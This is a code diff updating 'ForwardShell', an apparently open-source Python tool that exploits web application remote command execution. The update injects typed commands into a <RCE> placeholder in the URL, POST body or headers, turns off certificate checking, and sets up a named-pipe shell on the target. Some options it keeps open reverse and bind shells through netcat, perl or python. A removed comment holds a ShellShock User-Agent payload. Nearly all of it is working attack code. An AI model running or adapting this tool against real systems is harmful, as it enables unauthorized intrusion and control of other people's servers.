@@ -21,7 +21,9 @@ import sys
 import os
 import gzip
 import re
+import urllib.parse
 from os.path import dirname
+from urllib3.exceptions import InsecureRequestWarning
 
 class WebShell(object):
 
@@ -39,9 +41,8 @@ class WebShell(object):
     def __init__(self):
         print(f"[*] {__progname__} v{__version__}:")
         # Set up basic things
-        self.url = options.u
-        self.parameter = options.p
-        self.method = options.m.lower()
+        self.url = options.url
+        self.data = options.data
         self.lhost = options.lhost
         self.lport = options.lport
         self.revshell = options.revshell.lower()
@@ -50,22 +51,23 @@ class WebShell(object):
         self.verbose = options.verbose
         self.display_prefix = options.prefix
         self.display_suffix = options.suffix
-        
+
         # Set up proxy
         self.proxies = {}
-        if options.P:
-            self.proxies = {'http': f'{options.P}'}
+        if options.proxy:
+            self.proxies = {'http': f'{options.proxy}'}
             if self.verbose: print(f"[VERBOSE] Using proxy {self.proxies['http']}")
 
         # Setup additional headers
         self.headers = {}
         self.headers['User-Agent'] = f'{__progname__}/{__version__}'
+        self.headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
-        if options.C:
-            self.headers['Cookie'] = options.C
+        if options.cookie:
+            self.headers['Cookie'] = options.cookie
         
-        if options.H:
-            for header in options.H:
+        if options.header:
+            for header in options.header:
                 header_name, header_value =  header[0].split(':')
                 self.headers[f'{header_name.strip()}'] = header_value.strip()
 
@@ -83,6 +85,12 @@ class WebShell(object):
         elif options.speed.strip().lower() == 'slow':
             self.interval=3
 
+        # Set up HTTP method
+        self.method = 'get'
+        if self.data:
+            self.method = 'post'
+        if self.verbose: print(f"[VERBOSE] Using HTTP method {self.method.upper()}")
+
         # Set up chunk size for file upload
         self.chunk_size = 1850 # default if using GET
         if self.method == 'post':
@@ -90,6 +98,7 @@ class WebShell(object):
         if self.verbose: print(f"[VERBOSE] Using a chunk size of {self.chunk_size} characters when uploading files")
 
         # Request local file path on target for needed binary files
+        print(f"[*] Trying to set up {__progname__} on Target {self.uri_parser(self.url)}")
         self.GetProg()
 
         # Set up fifo session
@@ -100,7 +109,6 @@ class WebShell(object):
         MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"
 
         # Set up shell
-        print(f"[*] Trying to set up {__progname__} on Target {self.url}")
         self.RunRawCmd(MakeNamedPipes, timeout=1)
         raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
         CheckConnction = self.DisplayResp(raw_result)
@@ -192,10 +200,10 @@ class WebShell(object):
 
     def Error(self, raw_result, filtered_result):
         if self.verbose:
-            print(f"[VERBOSE] Original server response was \'{raw_result}\'")
+            print(f"[VERBOSE] This was the server response:\n \'{raw_result}\'")
             print(f"[VERBOSE] Server response after display filter is \'{filtered_result}\'")
-            print(f"[VERBOSE] Likely that you have to adjust the values for -prefix and -suffix or your request URL with parameter is wrong")
-        print(f"[ERROR] Cannot establish a shell with URL {self.url}?{self.parameter}={{CommandInjection}}")
+            print(f"[VERBOSE] Likely that you have to adjust the values for -prefix and -suffix or your request URL with the provided data is wrong")
+        print(f"[ERROR] Cannot establish a shell with URL {self.uri_parser(self.url)} and the provided data")
         print(f"[ERROR] Please use the program switch -verbose to get more details of the connection issue or -h to get more help")
         exit()
 
@@ -513,17 +521,30 @@ class WebShell(object):
 
     # Execute command
     def RunRawCmd(self, cmd, timeout=10):
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-        # self.headers = {'User-Agent': f'() {{:;}}; {cmd}'} # MODIFY THIS: Payload in User-Agent if you have no Webshell but ShellShock
+        # Use this to adjust your RCE payload even more
+        payload = urllib.parse.quote(cmd)
 
-        payload = cmd # Change this if your command needs some more adjustment
-        data = {self.parameter: payload}
+        # Replace <RCE> in the URL
+        rce_url = self.url.replace('<RCE>', payload)
+
+        # Replace <RCE> in the POST body
+        if self.data:
+            rce_data = self.data.replace('<RCE>', payload)
+
+        # Replace <RCE> in the header
+        rce_header = self.headers.copy()
+        for header in rce_header:
+            current_value = rce_header.get(header)
+            new_value = current_value.replace('<RCE>', payload)
+            rce_header[header] = new_value
 
         try:
             if self.method == 'post':
-                    r = requests.post(self.url, data=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
+                    r = requests.post(rce_url, data=rce_data, headers=rce_header, proxies=self.proxies, timeout=timeout, verify=False)
             elif self.method == 'get':
-                    r = requests.get(self.url, params=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
+                    r = requests.get(rce_url, headers=rce_header, proxies=self.proxies, timeout=timeout, verify=False)
             return r.text
         except:
             pass
@@ -555,6 +576,7 @@ class WebShell(object):
 # GetBinPath            Gets the full path of a certain binary at the target         #
 # GetProg               Gets the full path of Python and Netcat at the target        #
 # split_chunks          Splits a string in chunks (for File Download)                #
+# uri_parser            Splits a url and gives the FQDN                              #
 #                                                                                    #
 ######################################################################################
 
@@ -592,32 +614,39 @@ class WebShell(object):
         binary_found = False
 
         try:
-            # check if which found already and use it to search for binaries
-            if self.WHICH:
-                filename = f'{self.WHICH} {file}'
-                raw_result = self.RunRawCmd(filename)
-                result = self.DisplayResp(raw_result)
-                if self.verbose: print(f"[VERBOSE] Found binary path {result}")
-                return result
+            if self.verbose: print(f"[VERBOSE] Searching file path for binary {file} on {self.uri_parser(self.url)}")
 
-        except:
-            # if which has not found already or is not available at all, search the binary in common binary paths
-            prog_path = ["/usr/bin", "/usr/sbin", "/sbin", "/bin"]
-            for path in prog_path:
-                filename = f'ls {path}/{file}'
-                raw_result = self.RunRawCmd(filename)
-                result = self.DisplayResp(raw_result)
-                if result == f'{path}/{file}':
-                    if self.verbose: print(f"[VERBOSE] Found binary path {result}")
-                    binary_found = True
+            try:
+                # check if which found already and use it to search for binaries
+                if self.WHICH:
+                    filename = f'{self.WHICH} {file}'
+                    raw_result = self.RunRawCmd(filename)
+                    result = self.DisplayResp(raw_result)
+                    if self.verbose: print(f"[VERBOSE] Found binary path {result} by using {self.WHICH}")
                     return result
-                else:
-                    if self.verbose: print(f'[VERBOSE] Binary {file} not found in {path}')
-                    pass
-            # If not even the binary bash has been found, the program has to be stopped
-            if binary_found == False:
-                if file == 'bash':
-                    self.Error(raw_result, result)
+
+            except:
+                # if which has not found already or is not available at all, search the binary in common binary paths
+                prog_path = ["/usr/bin", "/usr/sbin", "/sbin", "/bin"]
+                for path in prog_path:
+                    filename = f'ls {path}/{file}'
+                    raw_result = self.RunRawCmd(filename)
+                    result = self.DisplayResp(raw_result)
+                    if result == f'{path}/{file}':
+                        if self.verbose: print(f"[VERBOSE] Found binary path {result} by discovering target")
+                        binary_found = True
+                        return result
+                    else:
+                        if self.verbose: print(f'[VERBOSE] Binary {file} not found in {path}')
+                        pass
+                # If not even the binary bash has been found, the program has to be stopped
+                if binary_found == False:
+                    if file == 'bash':
+                        if self.verbose: print(f'[VERBOSE] Without binary {file}, {__progname__} does not run')
+                        self.Error(raw_result, result)
+        except:
+            print(f"[ERROR] Cannot connect to {self.uri_parser(self.url)}")
+            exit()
 
     # Get path of needed binaries on target
     def GetProg(self):
@@ -672,6 +701,12 @@ class WebShell(object):
         while seq:
             yield seq[:n]
             seq = seq[n:]
+
+    # Parse the URL and returns values
+    def uri_parser(self, url):
+        parsed_uri = urllib.parse.urlparse(url)
+        result = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
+        return result[:-1]
     
 ######################################################################################
 #                                                                                    #
@@ -682,20 +717,41 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.2.5'
+    __version__ = '0.3.0'
 
     parser = argparse.ArgumentParser(
-        add_help = True,
-        description = f'{__progname__} v{__version__} - Exploits a simple Webshell RCE and builds a semiautomatic shell',
-        usage = f'python3 {__progname__}.py [-u <url>] [-p <cmd>] -M [<post>] [-P <proxy>]',
-        epilog = 'HAVE FUN AND DON\'T BE EVIL!')
+        add_help=True,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description=f'{__progname__} v{__version__} - Exploits a simple Web application RCE and builds a semiautomatic shell',
+        usage=f'python3 {__progname__}.py -url <url> [-data <post-data>] [-prefix <prefix>] [-suffix <suffix>] [-P <proxy>]',
+        epilog=('Program Usage Examples:\n'
+        'PUT the keyword <RCE> in a GET request, a POST data body or even in an additional header\n'
+        'and it will be automatically replaced with the command you type in the shell\n'
+        '\n'
+        'RCE in a GET parameter:\n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=<RCE>&param3=ABC123\n'
+        '\n'
+        'RCE in a POST body parameter:\n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -data \'param1=foobar&cmd=<RCE>&param3=ABC123\'\n'
+        '\n'
+        'RCE in a header:\n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -header \'Authorization: <RCE>\'\n'
+        '\n'
+        'Strip unneeded parts of response:\n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -prefix \'<pre>\' -suffix \'</pre>\'\n'
+        '\n'
+        'Use a proxy:\n'
+        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=<RCE>&param3=ABC123 -proxy \'http://127.0.0.1:8080\'\n \n'
+        ))
 
-    parser.add_argument('-u', action='store', metavar='', help='http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]')
-    parser.add_argument('-m', action='store', metavar='', choices=['post', 'get'], default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
-    parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
-    parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')
-    parser.add_argument('-C', action='store', metavar='', default = '', help='Add a custom session cookie')
-    parser.add_argument('-H', action='append', nargs='+', metavar='', help='Add one ore more additional header')
+    parser.add_argument('-url', action='store', metavar='', help='Target URL (e.g. http://www.site.com/upload/shell.php?cmd=<RCE>')
+    parser.add_argument('-data', action='store', metavar='', default = '', help='Data string to be sent through POST (e.g. "cmd=<RCE>")')
+    parser.add_argument('-prefix', action='store', metavar='', default = '', help='If the responses has more then the expected RCE output use -prefix to set the unneeded pattern in front the output')
+    parser.add_argument('-suffix', action='store', metavar='', default = '', help='If the response has more then the expected RCE output use -suffix to define the unneeded pattern after the output')
+    parser.add_argument('-cookie', action='store', metavar='', default = '', help='HTTP Cookie header value (e.g. "PHPSESSID=h5onbf...")')
+    parser.add_argument('-header', action='append', nargs='+', metavar='', help='Extra header (e.g. "Authorization: Basic QWxhZ..."')
+    parser.add_argument('-proxy', action='store', metavar='', default = '', help='Use a proxy to connect to the target URL [http(s)://host:port]')
+    parser.add_argument('-verbose', action='store_true', default = False, help='Verbose output')
 
     group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
     group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
@@ -704,9 +760,7 @@ if __name__ == '__main__':
     group.add_argument('-bindshell', action='store', metavar='', choices=['python', 'netcat', 'perl'], default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
     group.add_argument('-speed', action='store', metavar='', choices=['insane', 'fast', 'medium', 'slow'], default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
     group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help='Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')
-    group.add_argument('-prefix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -prefix to define the unneeded pattern in front the output')
-    group.add_argument('-suffix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -suffix to define the unneeded pattern after the output')
-    group.add_argument('-verbose', action='store_true', default = False, help='Use it to set verbose output')
+
     options = parser.parse_args()
 
     if len(sys.argv)==1:
